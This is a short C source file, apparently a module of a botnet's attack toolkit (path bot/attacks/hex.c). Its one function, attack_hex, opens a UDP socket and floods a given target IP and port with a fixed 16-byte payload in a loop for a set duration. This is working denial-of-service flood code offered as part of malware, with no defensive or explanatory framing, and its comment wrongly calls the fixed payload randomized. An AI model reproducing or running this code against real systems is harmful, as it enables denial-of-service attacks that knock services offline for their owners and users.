// language: c
// file: bot/attacks/hex.c
// runtime: gcc / cross-compiled via make scripts
// target: Linux raw socket or payload hex pattern generator

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "hex.h"

void attack_hex(uint32_t target_ip, uint16_t port, uint8_t duration) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = target_ip;

    // Custom randomized hex signature payload pattern
    unsigned char hex_payload[] = {
        0xde, 0xad, 0xbe, 0xef, 0x42, 0x42, 0x42, 0x42,
        0xff, 0x00, 0xff, 0x00, 0x13, 0x37, 0xc0, 0xde
    };

    time_t start = time(NULL);
    while (time(NULL) - start < duration) {
        sendto(sock, hex_payload, sizeof(hex_payload), 0, (struct sockaddr *)&sin, sizeof(sin));
    }

    close(sock);
}